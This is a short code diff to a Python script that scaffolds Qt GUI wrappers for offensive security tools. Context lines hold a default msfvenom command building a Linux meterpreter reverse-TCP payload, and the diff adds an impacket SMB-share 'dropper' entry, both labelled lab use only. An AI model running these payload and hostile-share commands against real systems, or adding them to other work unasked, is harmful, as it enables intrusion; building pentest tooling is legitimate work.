@@ -38,6 +38,10 @@ TOOLS = [
       color="#ff0040", desc="VenomForge — payload generator GUI over msfvenom.",
       args="-p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /tmp/payload.elf", target="",
       warn="LAB USE ONLY. Generating or using payloads outside authorized tests is illegal."),
+ dict(d="smbdrop", cls="SmbDrop", exe="smbdrop", backend="python3",
+      color="#00ff88", desc="SmbDrop — SMB share dropper GUI over impacket smbserver.",
+      args="/usr/share/doc/python3-impacket/examples/smbserver.py -smb2support PubShare /tmp/smbshare", target="",
+      warn="LAB USE ONLY. Hostile shares outside authorized tests are illegal."),
 ]
 
 HEADER = "// Copyright (c) 2026 oday. All Rights Reserved.\n// Proprietary License, see LICENSE file.\n// Qt toolkit components remain under GNU (L)GPL by The Qt Company Ltd.\n"
@@ -224,5 +228,8 @@ def gen(t):
     print("scaffolded", t["d"])
 
 for t in TOOLS:
+    if os.path.exists(os.path.join(ROOT, t["d"])):
+        print("exists, skip", t["d"])
+        continue
     gen(t)
 print("fleet done:", len(TOOLS))
